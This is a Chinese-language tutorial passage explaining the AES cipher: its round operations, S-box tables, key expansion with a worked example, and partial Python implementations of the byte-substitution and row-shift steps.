<p>AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。<br><img src="https://img-blog.csdn.net/20170219161202485?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="aes_struct"><br> 上图也展示了AES解密过程，解密过程仍为10轮，每一轮的操作是加密操作的逆操作。由于AES的4个轮操作都是可逆的，因此，解密操作的一轮就是顺序执行逆行移位、逆字节代换、轮密钥加和逆列混合。同加密操作类似，最后一轮不执行逆列混合，在第1轮解密之前，要执行1次密钥加操作。</p>
<p>下面分别介绍AES中一轮的4个操作阶段，这4分操作阶段使输入位得到充分的混淆。</p>
<h3 id="一、字节代换"><a href="#一、字节代换" class="headerlink" title="一、字节代换"></a>一、字节代换</h3><h4 id="1-字节代换操作"><a href="#1-字节代换操作" class="headerlink" title="1.字节代换操作"></a>1.字节代换操作</h4><p>AES的字节代换其实就是一个简单的查表操作。AES定义了一个S盒和一个逆S盒。<br> AES的S盒：</p>
<table>
<thead>
<tr>
<th>行/列</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>A</th>
<th>B</th>
<th>C</th>
<th>D</th>
<th>E</th>
<th>F</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x63</td>
<td>0x7c</td>
<td>0x77</td>
<td>0x7b</td>
<td>0xf2</td>
<td>0x6b</td>
<td>0x6f</td>
<td>0xc5</td>
<td>0x30</td>
<td>0x01</td>
<td>0x67</td>
<td>0x2b</td>
<td>0xfe</td>
<td>0xd7</td>
<td>0xab</td>
<td>0x76</td>
</tr>
<tr>
<td>1</td>
<td>0xca</td>
<td>0x82</td>
<td>0xc9</td>
<td>0x7d</td>
<td>0xfa</td>
<td>0x59</td>
<td>0x47</td>
<td>0xf0</td>
<td>0xad</td>
<td>0xd4</td>
<td>0xa2</td>
<td>0xaf</td>
<td>0x9c</td>
<td>0xa4</td>
<td>0x72</td>
<td>0xc0</td>
</tr>
<tr>
<td>2</td>
<td>0xb7</td>
<td>0xfd</td>
<td>0x93</td>
<td>0x26</td>
<td>0x36</td>
<td>0x3f</td>
<td>0xf7</td>
<td>0xcc</td>
<td>0x34</td>
<td>0xa5</td>
<td>0xe5</td>
<td>0xf1</td>
<td>0x71</td>
<td>0xd8</td>
<td>0x31</td>
<td>0x15</td>
</tr>
<tr>
<td>3</td>
<td>0x04</td>
<td>0xc7</td>
<td>0x23</td>
<td>0xc3</td>
<td>0x18</td>
<td>0x96</td>
<td>0x05</td>
<td>0x9a</td>
<td>0x07</td>
<td>0x12</td>
<td>0x80</td>
<td>0xe2</td>
<td>0xeb</td>
<td>0x27</td>
<td>0xb2</td>
<td>0x75</td>
</tr>
<tr>
<td>4</td>
<td>0x09</td>
<td>0x83</td>
<td>0x2c</td>
<td>0x1a</td>
<td>0x1b</td>
<td>0x6e</td>
<td>0x5a</td>
<td>0xa0</td>
<td>0x52</td>
<td>0x3b</td>
<td>0xd6</td>
<td>0xb3</td>
<td>0x29</td>
<td>0xe3</td>
<td>0x2f</td>
<td>0x84</td>
</tr>
<tr>
<td>5</td>
<td>0x53</td>
<td>0xd1</td>
<td>0x00</td>
<td>0xed</td>
<td>0x20</td>
<td>0xfc</td>
<td>0xb1</td>
<td>0x5b</td>
<td>0x6a</td>
<td>0xcb</td>
<td>0xbe</td>
<td>0x39</td>
<td>0x4a</td>
<td>0x4c</td>
<td>0x58</td>
<td>0xcf</td>
</tr>
<tr>
<td>6</td>
<td>0xd0</td>
<td>0xef</td>
<td>0xaa</td>
<td>0xfb</td>
<td>0x43</td>
<td>0x4d</td>
<td>0x33</td>
<td>0x85</td>
<td>0x45</td>
<td>0xf9</td>
<td>0x02</td>
<td>0x7f</td>
<td>0x50</td>
<td>0x3c</td>
<td>0x9f</td>
<td>0xa8</td>
</tr>
<tr>
<td>7</td>
<td>0x51</td>
<td>0xa3</td>
<td>0x40</td>
<td>0x8f</td>
<td>0x92</td>
<td>0x9d</td>
<td>0x38</td>
<td>0xf5</td>
<td>0xbc</td>
<td>0xb6</td>
<td>0xda</td>
<td>0x21</td>
<td>0x10</td>
<td>0xff</td>
<td>0xf3</td>
<td>0xd2</td>
</tr>
<tr>
<td>8</td>
<td>0xcd</td>
<td>0x0c</td>
<td>0x13</td>
<td>0xec</td>
<td>0x5f</td>
<td>0x97</td>
<td>0x44</td>
<td>0x17</td>
<td>0xc4</td>
<td>0xa7</td>
<td>0x7e</td>
<td>0x3d</td>
<td>0x64</td>
<td>0x5d</td>
<td>0x19</td>
<td>0x73</td>
</tr>
<tr>
<td>9</td>
<td>0x60</td>
<td>0x81</td>
<td>0x4f</td>
<td>0xdc</td>
<td>0x22</td>
<td>0x2a</td>
<td>0x90</td>
<td>0x88</td>
<td>0x46</td>
<td>0xee</td>
<td>0xb8</td>
<td>0x14</td>
<td>0xde</td>
<td>0x5e</td>
<td>0x0b</td>
<td>0xdb</td>
</tr>
<tr>
<td>A</td>
<td>0xe0</td>
<td>0x32</td>
<td>0x3a</td>
<td>0x0a</td>
<td>0x49</td>
<td>0x06</td>
<td>0x24</td>
<td>0x5c</td>
<td>0xc2</td>
<td>0xd3</td>
<td>0xac</td>
<td>0x62</td>
<td>0x91</td>
<td>0x95</td>
<td>0xe4</td>
<td>0x79</td>
</tr>
<tr>
<td>B</td>
<td>0xe7</td>
<td>0xc8</td>
<td>0x37</td>
<td>0x6d</td>
<td>0x8d</td>
<td>0xd5</td>
<td>0x4e</td>
<td>0xa9</td>
<td>0x6c</td>
<td>0x56</td>
<td>0xf4</td>
<td>0xea</td>
<td>0x65</td>
<td>0x7a</td>
<td>0xae</td>
<td>0x08</td>
</tr>
<tr>
<td>C</td>
<td>0xba</td>
<td>0x78</td>
<td>0x25</td>
<td>0x2e</td>
<td>0x1c</td>
<td>0xa6</td>
<td>0xb4</td>
<td>0xc6</td>
<td>0xe8</td>
<td>0xdd</td>
<td>0x74</td>
<td>0x1f</td>
<td>0x4b</td>
<td>0xbd</td>
<td>0x8b</td>
<td>0x8a</td>
</tr>
<tr>
<td>D</td>
<td>0x70</td>
<td>0x3e</td>
<td>0xb5</td>
<td>0x66</td>
<td>0x48</td>
<td>0x03</td>
<td>0xf6</td>
<td>0x0e</td>
<td>0x61</td>
<td>0x35</td>
<td>0x57</td>
<td>0xb9</td>
<td>0x86</td>
<td>0xc1</td>
<td>0x1d</td>
<td>0x9e</td>
</tr>
<tr>
<td>E</td>
<td>0xe1</td>
<td>0xf8</td>
<td>0x98</td>
<td>0x11</td>
<td>0x69</td>
<td>0xd9</td>
<td>0x8e</td>
<td>0x94</td>
<td>0x9b</td>
<td>0x1e</td>
<td>0x87</td>
<td>0xe9</td>
<td>0xce</td>
<td>0x55</td>
<td>0x28</td>
<td>0xdf</td>
</tr>
<tr>
<td>F</td>
<td>0x8c</td>
<td>0xa1</td>
<td>0x89</td>
<td>0x0d</td>
<td>0xbf</td>
<td>0xe6</td>
<td>0x42</td>
<td>0x68</td>
<td>0x41</td>
<td>0x99</td>
<td>0x2d</td>
<td>0x0f</td>
<td>0xb0</td>
<td>0x54</td>
<td>0xbb</td>
<td>0x16</td>
</tr>
</tbody></table>
<p>状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。例如，加密时，输出的字节S1为0x12,则查S盒的第0x01行和0x02列，得到值0xc9,然后替换S1原有的0x12为0xc9。状态矩阵经字节代换后的图如下：<br><img src="https://img-blog.csdn.net/20170219171003857?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="byte"></p>
<h4 id="2-字节代换逆操作"><a href="#2-字节代换逆操作" class="headerlink" title="2.字节代换逆操作"></a>2.字节代换逆操作</h4><p>逆字节代换也就是查逆S盒来变换，逆S盒如下：</p>
<table>
<thead>
<tr>
<th>行/列</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>A</th>
<th>B</th>
<th>C</th>
<th>D</th>
<th>E</th>
<th>F</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x52</td>
<td>0x09</td>
<td>0x6a</td>
<td>0xd5</td>
<td>0x30</td>
<td>0x36</td>
<td>0xa5</td>
<td>0x38</td>
<td>0xbf</td>
<td>0x40</td>
<td>0xa3</td>
<td>0x9e</td>
<td>0x81</td>
<td>0xf3</td>
<td>0xd7</td>
<td>0xfb</td>
</tr>
<tr>
<td>1</td>
<td>0x7c</td>
<td>0xe3</td>
<td>0x39</td>
<td>0x82</td>
<td>0x9b</td>
<td>0x2f</td>
<td>0xff</td>
<td>0x87</td>
<td>0x34</td>
<td>0x8e</td>
<td>0x43</td>
<td>0x44</td>
<td>0xc4</td>
<td>0xde</td>
<td>0xe9</td>
<td>0xcb</td>
</tr>
<tr>
<td>2</td>
<td>0x54</td>
<td>0x7b</td>
<td>0x94</td>
<td>0x32</td>
<td>0xa6</td>
<td>0xc2</td>
<td>0x23</td>
<td>0x3d</td>
<td>0xee</td>
<td>0x4c</td>
<td>0x95</td>
<td>0x0b</td>
<td>0x42</td>
<td>0xfa</td>
<td>0xc3</td>
<td>0x4e</td>
</tr>
<tr>
<td>3</td>
<td>0x08</td>
<td>0x2e</td>
<td>0xa1</td>
<td>0x66</td>
<td>0x28</td>
<td>0xd9</td>
<td>0x24</td>
<td>0xb2</td>
<td>0x76</td>
<td>0x5b</td>
<td>0xa2</td>
<td>0x49</td>
<td>0x6d</td>
<td>0x8b</td>
<td>0xd1</td>
<td>0x25</td>
</tr>
<tr>
<td>4</td>
<td>0x72</td>
<td>0xf8</td>
<td>0xf6</td>
<td>0x64</td>
<td>0x86</td>
<td>0x68</td>
<td>0x98</td>
<td>0x16</td>
<td>0xd4</td>
<td>0xa4</td>
<td>0x5c</td>
<td>0xcc</td>
<td>0x5d</td>
<td>0x65</td>
<td>0xb6</td>
<td>0x92</td>
</tr>
<tr>
<td>5</td>
<td>0x6c</td>
<td>0x70</td>
<td>0x48</td>
<td>0x50</td>
<td>0xfd</td>
<td>0xed</td>
<td>0xb9</td>
<td>0xda</td>
<td>0x5e</td>
<td>0x15</td>
<td>0x46</td>
<td>0x57</td>
<td>0xa7</td>
<td>0x8d</td>
<td>0x9d</td>
<td>0x84</td>
</tr>
<tr>
<td>6</td>
<td>0x90</td>
<td>0xd8</td>
<td>0xab</td>
<td>0x00</td>
<td>0x8c</td>
<td>0xbc</td>
<td>0xd3</td>
<td>0x0a</td>
<td>0xf7</td>
<td>0xe4</td>
<td>0x58</td>
<td>0x05</td>
<td>0xb8</td>
<td>0xb3</td>
<td>0x45</td>
<td>0x06</td>
</tr>
<tr>
<td>7</td>
<td>0xd0</td>
<td>0x2c</td>
<td>0x1e</td>
<td>0x8f</td>
<td>0xca</td>
<td>0x3f</td>
<td>0x0f</td>
<td>0x02</td>
<td>0xc1</td>
<td>0xaf</td>
<td>0xbd</td>
<td>0x03</td>
<td>0x01</td>
<td>0x13</td>
<td>0x8a</td>
<td>0x6b</td>
</tr>
<tr>
<td>8</td>
<td>0x3a</td>
<td>0x91</td>
<td>0x11</td>
<td>0x41</td>
<td>0x4f</td>
<td>0x67</td>
<td>0xdc</td>
<td>0xea</td>
<td>0x97</td>
<td>0xf2</td>
<td>0xcf</td>
<td>0xce</td>
<td>0xf0</td>
<td>0xb4</td>
<td>0xe6</td>
<td>0x73</td>
</tr>
<tr>
<td>9</td>
<td>0x96</td>
<td>0xac</td>
<td>0x74</td>
<td>0x22</td>
<td>0xe7</td>
<td>0xad</td>
<td>0x35</td>
<td>0x85</td>
<td>0xe2</td>
<td>0xf9</td>
<td>0x37</td>
<td>0xe8</td>
<td>0x1c</td>
<td>0x75</td>
<td>0xdf</td>
<td>0x6e</td>
</tr>
<tr>
<td>A</td>
<td>0x47</td>
<td>0xf1</td>
<td>0x1a</td>
<td>0x71</td>
<td>0x1d</td>
<td>0x29</td>
<td>0xc5</td>
<td>0x89</td>
<td>0x6f</td>
<td>0xb7</td>
<td>0x62</td>
<td>0x0e</td>
<td>0xaa</td>
<td>0x18</td>
<td>0xbe</td>
<td>0x1b</td>
</tr>
<tr>
<td>B</td>
<td>0xfc</td>
<td>0x56</td>
<td>0x3e</td>
<td>0x4b</td>
<td>0xc6</td>
<td>0xd2</td>
<td>0x79</td>
<td>0x20</td>
<td>0x9a</td>
<td>0xdb</td>
<td>0xc0</td>
<td>0xfe</td>
<td>0x78</td>
<td>0xcd</td>
<td>0x5a</td>
<td>0xf4</td>
</tr>
<tr>
<td>C</td>
<td>0x1f</td>
<td>0xdd</td>
<td>0xa8</td>
<td>0x33</td>
<td>0x88</td>
<td>0x07</td>
<td>0xc7</td>
<td>0x31</td>
<td>0xb1</td>
<td>0x12</td>
<td>0x10</td>
<td>0x59</td>
<td>0x27</td>
<td>0x80</td>
<td>0xec</td>
<td>0x5f</td>
</tr>
<tr>
<td>D</td>
<td>0x60</td>
<td>0x51</td>
<td>0x7f</td>
<td>0xa9</td>
<td>0x19</td>
<td>0xb5</td>
<td>0x4a</td>
<td>0x0d</td>
<td>0x2d</td>
<td>0xe5</td>
<td>0x7a</td>
<td>0x9f</td>
<td>0x93</td>
<td>0xc9</td>
<td>0x9c</td>
<td>0xef</td>
</tr>
<tr>
<td>E</td>
<td>0xa0</td>
<td>0xe0</td>
<td>0x3b</td>
<td>0x4d</td>
<td>0xae</td>
<td>0x2a</td>
<td>0xf5</td>
<td>0xb0</td>
<td>0xc8</td>
<td>0xeb</td>
<td>0xbb</td>
<td>0x3c</td>
<td>0x83</td>
<td>0x53</td>
<td>0x99</td>
<td>0x61</td>
</tr>
<tr>
<td>F</td>
<td>0x17</td>
<td>0x2b</td>
<td>0x04</td>
<td>0x7e</td>
<td>0xba</td>
<td>0x77</td>
<td>0xd6</td>
<td>0x26</td>
<td>0xe1</td>
<td>0x69</td>
<td>0x14</td>
<td>0x63</td>
<td>0x55</td>
<td>0x21</td>
<td>0x0c</td>
<td>0x7d</td>
</tr>
</tbody></table>
<h3 id="二、行移位"><a href="#二、行移位" class="headerlink" title="二、行移位"></a>二、行移位</h3><h4 id="1-行移位操作"><a href="#1-行移位操作" class="headerlink" title="1.行移位操作"></a>1.行移位操作</h4><p>行移位是一个简单的左循环移位操作。当密钥长度为128比特时，状态矩阵的第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节，如下图所示：<br><img src="https://img-blog.csdn.net/20170219174015167?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="shiftRows"></p>
<h4 id="2-行移位的逆变换"><a href="#2-行移位的逆变换" class="headerlink" title="2.行移位的逆变换"></a>2.行移位的逆变换</h4><p>行移位的逆变换是将状态矩阵中的每一行执行相反的移位操作，例如AES-128中，状态矩阵的第0行右移0字节，第1行右移1字节，第2行右移2字节，第3行右移3字节。</p>
<h3 id="三、列混合"><a href="#三、列混合" class="headerlink" title="三、列混合"></a>三、列混合</h3><h4 id="1-列混合操作"><a href="#1-列混合操作" class="headerlink" title="1.列混合操作"></a>1.列混合操作</h4><p>列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的矩阵相乘，得到混淆后的状态矩阵，如下图的公式所示：<br><img src="https://img-blog.csdn.net/20170219203346436?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col"></p>
<p>状态矩阵中的第j列(0 ≤j≤3)的列混合可以表示为下图所示：<br><img src="https://img-blog.csdn.net/20170219203742516?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col2"></p>
<p>其中，矩阵元素的乘法和加法都是定义在基于GF(2^8)上的二元运算,并不是通常意义上的乘法和加法。这里涉及到一些信息安全上的数学知识，不过不懂这些知识也行。其实这种二元运算的加法等价于两个字节的异或，乘法则复杂一点。对于一个8位的二进制数来说，使用域上的乘法乘以(00000010)等价于左移1位(低位补0)后，再根据情况同(00011011)进行异或运算，设S1  = (a7 a6 a5 a4 a3 a2 a1 a0)，刚0x02 * S1如下图所示：<br><img src="https://img-blog.csdn.net/20170219204822517?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col3"><br> 也就是说，如果a7为1，则进行异或运算，否则不进行。<br> 类似地，乘以(00000100)可以拆分成两次乘以(00000010)的运算：<br><img src="https://img-blog.csdn.net/20170219205601683?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col4"><br> 乘以(0000 0011)可以拆分成先分别乘以(0000 0001)和(0000 0010)，再将两个乘积异或：<br><img src="https://img-blog.csdn.net/20170219210554133?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col5"><br> 因此，我们只需要实现乘以2的函数，其他数值的乘法都可以通过组合来实现。<br> 下面举个具体的例子,输入的状态矩阵如下：</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>C9</td>
<td>E5</td>
<td>FD</td>
<td>2B</td>
</tr>
<tr>
<td>7A</td>
<td>F2</td>
<td>78</td>
<td>6E</td>
</tr>
<tr>
<td>63</td>
<td>9C</td>
<td>26</td>
<td>67</td>
</tr>
<tr>
<td>B0</td>
<td>A7</td>
<td>82</td>
<td>E5</td>
</tr>
</tbody></table>
<p>下面，进行列混合运算：<br> 以第一列的运算为例：<br><img src="https://img-blog.csdn.net/20170219213747965?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col7"><br> 其它列的计算就不列举了，列混合后生成的新状态矩阵如下：</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>D4</td>
<td>E7</td>
<td>CD</td>
<td>66</td>
</tr>
<tr>
<td>28</td>
<td>02</td>
<td>E5</td>
<td>BB</td>
</tr>
<tr>
<td>BE</td>
<td>C6</td>
<td>D6</td>
<td>BF</td>
</tr>
<tr>
<td>22</td>
<td>0F</td>
<td>DF</td>
<td>A5</td>
</tr>
</tbody></table>
<h4 id="2-列混合逆运算"><a href="#2-列混合逆运算" class="headerlink" title="2.列混合逆运算"></a>2.列混合逆运算</h4><p>逆向列混合变换可由下图的矩阵乘法定义：<br><img src="https://img-blog.csdn.net/20170219211139752?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col6"><br> 可以验证，逆变换矩阵同正变换矩阵的乘积恰好为单位矩阵。</p>
<h3 id="四、轮密钥加"><a href="#四、轮密钥加" class="headerlink" title="四、轮密钥加"></a>四、轮密钥加</h3><p>轮密钥加是将128位轮密钥Ki同状态矩阵中的数据进行逐位异或操作，如下图所示。其中，密钥Ki中每个字W[4i],W[4i+1],W[4i+2],W[4i+3]为32位比特字，包含4个字节，他们的生成算法下面在下面介绍。轮密钥加过程可以看成是字逐位异或的结果，也可以看成字节级别或者位级别的操作。也就是说，可以看成S0  S1 S2 S3 组成的32位字与W[4i]的异或运算。<br><img src="https://img-blog.csdn.net/20170220080512086?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="roundadd"><br> 轮密钥加的逆运算同正向的轮密钥加运算完全一致，这是因为异或的逆操作是其自身。轮密钥加非常简单，但却能够影响S数组中的每一位。</p>
<h3 id="五、密钥扩展"><a href="#五、密钥扩展" class="headerlink" title="五、密钥扩展"></a>五、密钥扩展</h3><p>AES首先将初始密钥输入到一个4<em>4的状态矩阵中，如下图所示。<br><img src="https://img-blog.csdn.net/20170220082316736?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="keyextends"><br> 这个4</em>4矩阵的每一列的4个字节组成一个字，矩阵4列的4个字依次命名为W[0]、W[1]、W[2]和W[3]，它们构成一个以字为单位的数组W。例如，设密钥K为”abcdefghijklmnop”,则K0  = ‘a’,K1 = ‘b’, K2 = ‘c’,K3 = ‘d’,W[0] = “abcd”。<br> 接着，对W数组扩充40个新列，构成总共44列的扩展密钥数组。新列以如下的递归方式产生：<br> 1.如果i不是4的倍数，那么第i列由如下等式确定：<br> W[i]=W[i-4]⨁W[i-1]<br> 2.如果i是4的倍数，那么第i列由如下等式确定：<br> W[i]=W[i-4]⨁T(W[i-1])<br> 其中，T是一个有点复杂的函数。<br> 函数T由3部分组成：字循环、字节代换和轮常量异或，这3部分的作用分别如下。<br> a.字循环：将1个字中的4个字节循环左移1个字节。即将输入字[b0, b1, b2, b3]变换成[b1,b2,b3,b0]。<br> b.字节代换：对字循环的结果使用S盒进行字节代换。<br> c.轮常量异或：将前两步的结果同轮常量Rcon[j]进行异或，其中j表示轮数。<br> 轮常量Rcon[j]是一个字，其值见下表。</p>
<table>
<thead>
<tr>
<th>j</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
</tr>
</thead>
<tbody><tr>
<td>Rcon[j]</td>
<td>01 00 00 00</td>
<td>02 00 00 00</td>
<td>04 00 00 00</td>
<td>08 00 00 00</td>
<td>10 00 00 00</td>
</tr>
<tr>
<td>j</td>
<td>6</td>
<td>7</td>
<td>8</td>
<td>9</td>
<td>10</td>
</tr>
<tr>
<td>Rcon[j]</td>
<td>20 00 00 00</td>
<td>40 00 00 00</td>
<td>80 00 00 00</td>
<td>1B 00 00 00</td>
<td>36 00 00 00</td>
</tr>
</tbody></table>
<p>下面举个例子：<br> 设初始的128位密钥为：<br> 3C A1 0B 21 57 F0 19 16 90 2E 13 80 AC C1 07 BD<br> 那么4个初始值为：<br> W[0] = 3C A1 0B 21<br> W[1] = 57 F0 19 16<br> W[2] = 90 2E 13 80<br> W[3] = AC C1 07 BD<br> 下面求扩展的第1轮的子密钥(W[4],W[5],W[6],W[7])。<br> 由于4是4的倍数，所以：<br> W[4] = W[0] ⨁ T(W[3])<br> T(W[3])的计算步骤如下：<br> \1. 循环地将W[3]的元素移位：AC C1 07 BD变成C1 07 BD AC;<br> \2. 将 C1 07 BD AC 作为S盒的输入，输出为78 C5 7A 91;<br> \3. 将78 C5 7A 91与第一轮轮常量Rcon[1]进行异或运算，将得到79 C5 7A 91，因此，T(W[3])=79 C5 7A 91，故<br> W[4] = 3C A1 0B 21 ⨁ 79 C5 7A 91 = 45 64 71 B0<br> 其余的3个子密钥段的计算如下：<br> W[5] = W[1] ⨁ W[4] = 57 F0 19 16 ⨁ 45 64 71 B0 = 12 94 68 A6<br> W[6] = W[2] ⨁ W[5] =90 2E 13 80 ⨁ 12 94 68 A6 = 82 BA 7B 26<br> W[7] = W[3] ⨁ W[6] = AC C1 07 BD ⨁ 82 BA 7B 26 = 2E 7B 7C 9B<br> 所以，第一轮的密钥为 45 64 71 B0 12 94 68 A6 82 BA 7B 26 2E 7B 7C 9B。</p>
<h3 id="六、AES解密"><a href="#六、AES解密" class="headerlink" title="六、AES解密"></a>六、AES解密</h3><p>在文章开始的图中，有AES解密的流程图，可以对应那个流程图来进行解密。下面介绍的是另一种等价的解密模式，流程图如下图所示。这种等价的解密模式使得解密过程各个变换的使用顺序同加密过程的顺序一致，只是用逆变换取代原来的变换。<br><img src="https://img-blog.csdn.net/20170220094853620?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="deaes"></p>
<h2 id="软件系统设计"><a href="#软件系统设计" class="headerlink" title="软件系统设计"></a>软件系统设计</h2><h4 id="XTime运算"><a href="#XTime运算" class="headerlink" title="XTime运算"></a>XTime运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xtime = <span class="keyword">lambda</span> a: (((a &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x1B</span>) &amp; <span class="number">0xFF</span>) <span class="keyword">if</span> (a &amp; <span class="number">0x80</span>) <span class="keyword">else</span> (a &lt;&lt; <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h4 id="字节替代"><a href="#字节替代" class="headerlink" title="字节替代"></a>字节替代</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__sub_bytes</span><span class="params">(self, s)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">			s[i][j] = Sbox[s[i][j]]</span><br></pre></td></tr></table></figure>

<p>AES的字节代换其实就是一个简单的查表操作。AES定义了一个S盒和一个逆S盒,状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出</p>
<h4 id="逆字节替换"><a href="#逆字节替换" class="headerlink" title="逆字节替换"></a>逆字节替换</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__inv_sub_bytes</span><span class="params">(self, s)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">			s[i][j] = InvSbox[s[i][j]]</span><br></pre></td></tr></table></figure>

<h4 id="行移位变换"><a href="#行移位变换" class="headerlink" title="行移位变换"></a>行移位变换</h4><p><img src="https://pic002.cnblogs.com/images/2010/169108/2010103102010146.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__shift_rows</span><span class="params">(self, s)</span>:</span></span><br><span class="line">	s[<span class="number">0</span>][<span class="number">1</span>], s[<span class="number">1</span>][<span class="number">1</span>], s[<span class="number">2</span>][<span class="number">1</span>], s[<span class="number">3</span>][<span class="number">1</span>] = s[<span class="number">1</span>][<span class="number">1</span>], s[<span class="number">2</span>][<span class="number">1</span>], s[<span class="number">3</span>][<span class="number">1</span>], s[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">	s[<span class="number">0</span>][<span class="number">2</span>], s[<span class="number">1</span>][<span class="number">2</span>], s[<span class="number">2</span>][<span class="number">2</span>], s[<span class="number">3</span>][<span class="number">2</span>] = s[<span class="number">2</span>][<span class="number">2</span>], s[<span class="number">3</span>][<span class="number">2</span>], s[<span class="number">0</span>][<span class="number">2</span>], s[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line">	s[<span class="number">0</span>][<span class="number">3</span>], s[<span class="number">1</span>][<span class="number">3</span>], s[<span class="number">2</span>][<span class="number">3</span>], s[<span class="number">3</span>][<span class="number">3</span>] = s[<span class="number">3</span>][<span class="number">3</span>], s[<span class="number">0</span>][<span class="number">3</span>], s[<span class="number">1</span>][<span class="number">3</span>], s[<span class="number">2</span>][<span class="number">3</span>]</span><br></pre></td></tr></table></figure>

<h4 id="逆行移位变换"><a href="#逆行移位变换" class="headerlink" title="逆行移位变换"></a>逆行移位变换</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__inv_shift_rows</span><span class="params">(self, s)</span>:</span></span><br><span class="line">	s[<span class="number">0</span>][<span class="number">1</span>], s[<span class="number">1</span>][<span class="number">1</span>], s[<span class="number">2</span>][<span 